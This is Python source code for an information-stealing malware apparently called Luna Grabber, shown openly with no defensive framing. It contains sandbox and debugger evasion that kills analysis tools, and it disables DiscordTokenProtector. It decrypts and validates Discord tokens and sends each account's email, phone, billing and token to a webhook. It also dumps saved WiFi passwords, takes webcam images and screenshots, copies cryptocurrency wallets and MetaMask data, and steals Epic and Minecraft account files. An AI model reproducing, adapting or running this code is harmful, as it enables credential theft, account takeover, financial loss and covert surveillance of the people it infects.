			'2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d',
			'00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e', '00-0E-A6-17-FA-F8'}
		self.blacklisted_processes = {
			"httpdebuggerui", "wireshark", "fiddler", "regedit", "cmd", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64",
			"ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga",
			"joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"}
		self.blacklisted_video_controllers = ["virtualbox", "vmware", "qemu", "parallels", "microsoft basic display adapter","microsoft hyper-v-video",
							"microsoft remote display adapter", "onrf_d", "pcwmg1n_e", "y9696y"]

		if self.checks():
			os._exit(0)

	def checks(self):
		return (
			self.check_process() or
			self.get_network() or
			self.get_system() or
			self.checkHTTPSimulation() or
			self.checkVideoController()
		)

	def check_process(self) -> bool:
		for proc in psutil.process_iter():
			if any(procstr in proc.name().lower() for procstr in self.blacklisted_processes):
				try:
					proc.kill()
				except (psutil.NoSuchProcess, psutil.AccessDenied):
					pass
		if sys.gettrace():
			os._exit(0)

	def get_network(self) -> bool:
		try:
			network_interfaces = psutil.net_if_addrs()
			for _, addresses in network_interfaces.items():
				for address in addresses:
					if address.address in self.blacklisted_ips or address.address in self.blacklisted_macs:
						return True
		except Exception:
			pass
		return False

	def get_system(self) -> bool:
		try:
			if os.getenv('USERNAME').lower() in self.blacklisted_users or os.getenv('COMPUTERNAME').lower() in self.blacklisted_pc_names:
				return True
			with subprocess.Popen("wmic csproduct get uuid", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) as p:
				uuid = p.stdout.read().decode('utf-8').strip().split('\n')[1].strip()
				if uuid.lower() in self.blacklisted_uuids:
					return True
		except Exception:
			pass
		return False
	
	def checkVideoController(self) -> bool:
		with subprocess.Popen("wmic path win32_VideoController get name", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) as p:
			video_controller = p.stdout.read().decode('utf-8').lower()
		r1 = any(controller in video_controller for controller in self.blacklisted_video_controllers)
		r2 = any([os.path.isdir(path) for path in ('D:\\Tools', 'D:\\OS2', 'D:\\NT3X')])
		return r1 or r2

	def checkHTTPSimulation(self) -> bool:
		try:
			requests.get(f'https://luna-{"".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=5))}.in')
		except Exception:
			return False
		else:
			return True


import re

class Discord:
    def __init__(self):
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regex = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens_sent = []
        self.tokens = []
        self.ids = []

        self.killprotector()
        self.grabTokens()
        self.upload(__CONFIG__["webhook"])


    def killprotector(self):
        path = f"{self.roaming}\\DiscordTokenProtector"
        config = path + "config.json"
    
        if not os.path.exists(path):
            return
    
        for process in ["\\DiscordTokenProtector.exe", "\\ProtectionPayload.dll", "\\secure.dat"]:
            try:
                os.remove(path + process)
            except FileNotFoundError:
                pass
    
        if os.path.exists(config):
            with open(config, errors="ignore") as f:
                try:
                    item = json.load(f)
                except json.decoder.JSONDecodeError:
                    return
                item['auto_start'] = False
                item['auto_start_discord'] = False
                item['integrity'] = False
                item['integrity_allowbetterdiscord'] = False
                item['integrity_checkexecutable'] = False
                item['integrity_checkhash'] = False
                item['integrity_checkmodule'] = False
                item['integrity_checkscripts'] = False
                item['integrity_checkresource'] = False
                item['integrity_redownloadhashes'] = False
                item['iterations_iv'] = 364
                item['iterations_key'] = 457
                item['version'] = 69420
    
            with open(config, 'w') as f:
                json.dump(item, f, indent=2, sort_keys=True)

    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"

    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def grabTokens(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.encrypted_regex, line):
                                token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tokens.append(token)
                                        self.ids.append(uid)
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            r = requests.get(self.baseurl, headers={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                                'Content-Type': 'application/json',
                                'Authorization': token})
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)

        if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            r = requests.get(self.baseurl, headers={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                                'Content-Type': 'application/json',
                                'Authorization': token})
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)

    def upload(self, webhook):
        for token in self.tokens:
            if token in self.tokens_sent:
                continue

            val = ""
            methods = ""
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'Content-Type': 'application/json',
                'Authorization': token
            }
            user = requests.get(self.baseurl, headers=headers).json()
            payment = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers).json()
            username = user['username']
            discord_id = user['id']
            avatar_url = f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif" \
                if requests.get(f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif").status_code == 200 \
                else f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.png"
            phone = user['phone']
            email = user['email']

            mfa = ":white_check_mark:" if user.get('mfa_enabled') else ":x:"

            premium_types = {
                0: ":x:",
                1: "Nitro Classic",
                2: "Nitro",
                3: "Nitro Basic"
            }
            nitro = premium_types.get(user.get('premium_type'), ":x:")

            if "message" in payment or payment == []:
                methods = ":x:"
            else:
                methods = "".join(["💳" if method['type'] == 1 else "<:paypal:973417655627288666>" if method['type'] == 2 else ":question:" for method in payment])

            val += f'<:1119pepesneakyevil:972703371221954630> **Discord ID:** `{discord_id}` \n<:gmail:1051512749538164747> **Email:** `{email}`\n:mobile_phone: **Phone:** `{phone}`\n\n:closed_lock_with_key: **2FA:** {mfa}\n<a:nitroboost:996004213354139658> **Nitro:** {nitro}\n<:billing:1051512716549951639> **Billing:** {methods}\n\n<:crown1:1051512697604284416> **Token:** `{token}`\n'

            data = {
                "embeds": [
                    {
                        "title": f"{username}",
                        "color": 5639644,
                        "fields": [
                            {
                                "name": "Discord Info",
                                "value": val
                            }
                        ],
                        "thumbnail": {
                            "url": avatar_url
                        },
                        "footer": {
                            "text": "Luna Grabber | Created By Smug"
                        },
                    }
                ],
                "username": "Luna",
                "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
            }

            requests.post(webhook, json=data)
            self.tokens_sent.append(token)

import pycountry

class PcInfo:
    def __init__(self):
        self.avatar = "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"
        self.username = "Luna"
        self.get_system_info(__CONFIG__["webhook"])

    def get_country_code(self, country_name):
        try:
            country = pycountry.countries.lookup(country_name)
            return str(country.alpha_2).lower()
        except LookupError:
            return "white"
        
    def get_all_avs(self) -> str:
        process = subprocess.run("WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName", shell=True, capture_output=True)
        if process.returncode == 0:
            output = process.stdout.decode(errors="ignore").strip().replace("\r\n", "\n").splitlines()
            if len(output) >= 2:
                output = output[1:]
                output = [av.strip() for av in output]
                return ", ".join(output)

    def get_system_info(self, webhook):
        computer_os = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()[2].strip()
        cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True).stdout.strip().split('\n')[2]
        gpu = subprocess.run("wmic path win32_VideoController get name", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
        ram = str(round(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True,
                  shell=True).stdout.decode(errors='ignore').strip().split()[1]) / (1024 ** 3)))
        username = os.getenv("UserName")
        hostname = os.getenv("COMPUTERNAME")
        uuid = subprocess.check_output(r'C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
        product_key = subprocess.run("wmic path softwarelicensingservice get OA3xOriginalProductKey", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip() if subprocess.run("wmic path softwarelicensingservice get OA3xOriginalProductKey", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip() != "" else "Failed to get product key"

        try:
            r: dict = requests.get("http://ip-api.com/json/?fields=225545").json()
            if r["status"] != "success":
                raise Exception("Failed")
            country = r["country"]
            proxy = r["proxy"]
            ip = r["query"]   
        except Exception:
            country = "Failed to get country"
            proxy = "Failed to get proxy"
            ip = "Failed to get IP"
                  
        _, addrs = next(iter(psutil.net_if_addrs().items()))
        mac = addrs[0].address

        data = {
            "embeds": [
                {
                    "title": "Luna Logger",
                    "color": 5639644,
                    "fields": [
                        {
                             "name": "System Info",
                             "value": f''':computer: **PC Username:** `{username}`
:desktop: **PC Name:** `{hostname}`
:globe_with_meridians: **OS:** `{computer_os}`
<:windows:1239719032849174568> **Product Key:** `{product_key}`\n
:eyes: **IP:** `{ip}`
:flag_{self.get_country_code(country)}: **Country:** `{country}`
{":shield:" if proxy else ":x:"} **Proxy:** `{proxy}`
:green_apple: **MAC:** `{mac}`
:wrench: **UUID:** `{uuid}`\n
<:cpu:1051512676947349525> **CPU:** `{cpu}`
<:gpu:1051512654591688815> **GPU:** `{gpu}`
<:ram1:1051518404181368972> **RAM:** `{ram}GB`\n
:cop: **Antivirus:** `{self.get_all_avs()}`
'''
                        }
                    ],
                    "footer": {
                        "text": "Luna Grabber | Created By Smug"
                    },
                    "thumbnail": {
                        "url": self.avatar
                    }
                }
            ],
            "username": self.username,
            "avatar_url": self.avatar
        }

        requests.post(webhook, json=data)


class Wifi:
	def __init__(self):
		self.networks = {}
		self.get_networks()
		self.save_networks()


	def get_networks(self):
		try:
			output_networks = subprocess.check_output(["netsh", "wlan", "show", "profiles"]).decode(errors='ignore')
			profiles = [line.split(":")[1].strip() for line in output_networks.split("\n") if "Profil" in line]
			
			for profile in profiles:
				if profile:
					self.networks[profile] = subprocess.check_output(["netsh", "wlan", "show", "profile", profile, "key=clear"]).decode(errors='ignore')
		except Exception:
			pass

	def save_networks(self):
		os.makedirs(os.path.join(temp_path, "Wifi"), exist_ok=True)
		if self.networks:
			for network, info in self.networks.items():			
				with open(os.path.join(temp_path, "Wifi", f"{network}.txt"), "wb") as f:
					f.write(info.encode("utf-8"))
		else:
			with open(os.path.join(temp_path, "Wifi", "No Wifi Networks Found.txt"), "w") as f:
				f.write("No wifi networks found.")

import cv2

def capture_images(num_images=1):
	num_cameras = 0
	cameras = []
	os.makedirs(os.path.join(temp_path, "Webcam"), exist_ok=True)

	while True:
		cap = cv2.VideoCapture(num_cameras)
		if not cap.isOpened():
			break
		cameras.append(cap)
		num_cameras += 1

	if num_cameras == 0:
		return

	for _ in range(num_images):
		for i, cap in enumerate(cameras):
			ret, frame = cap.read()
			if ret:
				cv2.imwrite(os.path.join(temp_path, "Webcam", f"image_from_camera_{i}.jpg"), frame)

	for cap in cameras:
		cap.release()



def steal_wallets():
    wallet_path = os.path.join(temp_path, "Wallets")
    os.makedirs(wallet_path, exist_ok=True)

    wallets = (
        ("Zcash", os.path.join(os.getenv("appdata"), "Zcash")),
        ("Armory", os.path.join(os.getenv("appdata"), "Armory")),
        ("Bytecoin", os.path.join(os.getenv("appdata"), "Bytecoin")),
        ("Jaxx", os.path.join(os.getenv("appdata"), "com.liberty.jaxx", "IndexedDB", "file_0.indexeddb.leveldb")),
        ("Exodus", os.path.join(os.getenv("appdata"), "Exodus", "exodus.wallet")),
        ("Ethereum", os.path.join(os.getenv("appdata"), "Ethereum", "keystore")),
        ("Electrum", os.path.join(os.getenv("appdata"), "Electrum", "wallets")),
        ("AtomicWallet", os.path.join(os.getenv("appdata"), "atomic", "Local Storage", "leveldb")),
        ("Guarda", os.path.join(os.getenv("appdata"), "Guarda", "Local Storage", "leveldb")),
        ("Coinomi", os.path.join(os.getenv("localappdata"), "Coinomi", "Coinomi", "wallets")),
    )

    browser_paths = {
        "Brave" : os.path.join(os.getenv("localappdata"), "BraveSoftware", "Brave-Browser", "User Data"),
        "Chrome" : os.path.join(os.getenv("localappdata"), "Google", "Chrome", "User Data"),
        "Chromium" : os.path.join(os.getenv("localappdata"), "Chromium", "User Data"),
        "Comodo" : os.path.join(os.getenv("localappdata"), "Comodo", "Dragon", "User Data"),
        "Edge" : os.path.join(os.getenv("localappdata"), "Microsoft", "Edge", "User Data"),
        "EpicPrivacy" : os.path.join(os.getenv("localappdata"), "Epic Privacy Browser", "User Data"),
        "Iridium" : os.path.join(os.getenv("localappdata"), "Iridium", "User Data"),
        "Opera" : os.path.join(os.getenv("appdata"), "Opera Software", "Opera Stable"),
        "Opera GX" : os.path.join(os.getenv("appdata"), "Opera Software", "Opera GX Stable"),
        "Slimjet" : os.path.join(os.getenv("localappdata"), "Slimjet", "User Data"),
        "UR" : os.path.join(os.getenv("localappdata"), "UR Browser", "User Data"),
        "Vivaldi" : os.path.join(os.getenv("localappdata"), "Vivaldi", "User Data"),
        "Yandex" : os.path.join(os.getenv("localappdata"), "Yandex", "YandexBrowser", "User Data")
    }

    for name, path in wallets:
        if os.path.isdir(path):
            named_wallet_path = os.path.join(wallet_path, name)
            os.makedirs(named_wallet_path, exist_ok=True)
            try:
                if path != named_wallet_path:
                    copytree(path, os.path.join(named_wallet_path, os.path.basename(path)), dirs_exist_ok=True)
            except Exception:
                pass

    for name, path in browser_paths.items():
        if os.path.isdir(path):
            for root, dirs, _ in os.walk(path):
                for dir_name in dirs:
                    if dir_name == "Local Extension Settings":
                        local_extensions_settings_dir = os.path.join(root, dir_name)
                        for ext_dir in ("ejbalbakoplchlghecdalmeeeajnimhm", "nkbihfbeogaeaoehlefnkodbefgpgknn"):
                            ext_path = os.path.join(local_extensions_settings_dir, ext_dir)
                            metamask_browser = os.path.join(wallet_path, "Metamask ({})".format(name))
                            named_wallet_path = os.path.join(metamask_browser, ext_dir)
                            if os.path.isdir(ext_path) and os.listdir(ext_path):
                                try:
                                    copytree(ext_path, named_wallet_path, dirs_exist_ok=True)
                                except Exception:
                                    pass
                                else:
                                    if not os.listdir(metamask_browser):
                                        rmtree(metamask_browser)
                                        



class Games:
    def __init__(self):
        self.StealEpic()
        self.StealMinecraft()
        
                        
    def GetLnkFromStartMenu(self, app: str) -> list[str]:
        shortcutPaths = []
        startMenuPaths = [
            os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs"),
            os.path.join("C:\\", "ProgramData", "Microsoft", "Windows", "Start Menu", "Programs")
        ]
        for startMenuPath in startMenuPaths:
            for root, _, files in os.walk(startMenuPath):
                for file in files:
                    if file.lower() == "%s.lnk" % app.lower():
                        shortcutPaths.append(os.path.join(root, file))       
        return shortcutPaths
    

    def StealEpic(self) -> None:
        if True:
            saveToPath = os.path.join(temp_path, "Games", "Epic")
            epicPath = os.path.join(os.getenv("localappdata"), "EpicGamesLauncher", "Saved", "Config", "Windows")
            if os.path.isdir(epicPath):
                loginFile = os.path.join(epicPath, "GameUserSettings.ini")
                if os.path.isfile(loginFile):
                    with open(loginFile) as file:
                        contents = file.read()
                    if "[RememberMe]" in contents:
                        try:
                            os.makedirs(saveToPath, exist_ok=True)
                            for file in os.listdir(epicPath):
                                if os.path.isfile(os.path.join(epicPath, file)):
                                    shutil.copy(os.path.join(epicPath, file), os.path.join(saveToPath, file))
                            shutil.copytree(epicPath, saveToPath, dirs_exist_ok=True)
                        except Exception:
                            pass

    def StealMinecraft(self) -> None:
        saveToPath = os.path.join(temp_path, "Games", "Minecraft")
        userProfile = os.getenv("userprofile")
        roaming = os.getenv("appdata")
        minecraftPaths = {
             "Intent" : os.path.join(userProfile, "intentlauncher", "launcherconfig"),
             "Lunar" : os.path.join(userProfile, ".lunarclient", "settings", "game", "accounts.json"),
             "TLauncher" : os.path.join(roaming, ".minecraft", "TlauncherProfiles.json"),
             "Feather" : os.path.join(roaming, ".feather", "accounts.json"),
             "Meteor" : os.path.join(roaming, ".minecraft", "meteor-client", "accounts.nbt"),
             "Impact" : os.path.join(roaming, ".minecraft", "Impact", "alts.json"),
             "Novoline" : os.path.join(roaming, ".minectaft", "Novoline", "alts.novo"),
             "CheatBreakers" : os.path.join(roaming, ".minecraft", "cheatbreaker_accounts.json"),
             "Microsoft Store" : os.path.join(roaming, ".minecraft", "launcher_accounts_microsoft_store.json"),
             "Rise" : os.path.join(roaming, ".minecraft", "Rise", "alts.txt"),
             "Rise (Intent)" : os.path.join(userProfile, "intentlauncher", "Rise", "alts.txt"),
             "Paladium" : os.path.join(roaming, "paladium-group", "accounts.json"),
             "PolyMC" : os.path.join(roaming, "PolyMC", "accounts.json"),
             "Badlion" : os.path.join(roaming, "Badlion Client", "accounts.json"),
        }

        for name, path in minecraftPaths.items():
            if os.path.isfile(path):
                try:
                    os.makedirs(os.path.join(saveToPath, name), exist_ok= True)
                    shutil.copy(path, os.path.join(saveToPath, name, os.path.basename(path)))
                except Exception:
                    continue

from PIL import ImageGrab

class Screenshot:
    def __init__(self):
        self.take_screenshot()
        self.send_screenshot()

    def take_screenshot(self):  
        image = ImageGrab.grab(
                    bbox=None,
                    all_screens=True,
                    include_layered_windows=False,
                    xdisplay=None
                )
        image.save(temp_path + "\\desktopshot.png")
        image.close()

    def send_screenshot(self):
        webhook_data = {
            "username": "Luna",
            "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
            "embeds": [
                {
                    "color": 5639644,
                    "title": "Desktop Screenshot",
                    "image": {
                        "url": "attachment://image.png"
                    }
                }
            ]
        }
        
        with open(temp_path + "\\desktopshot.png", "rb") as f:
            image_data = f.read()
            encoder = MultipartEncoder({'payload_json': json.dumps(webhook_data), 'file': ('image.png', image_data, 'image/png')})

        requests.post(__CONFIG__["webhook"], headers={'Content-type': encoder.content_type}, data=encoder)

Luna(__CONFIG__["webhook"])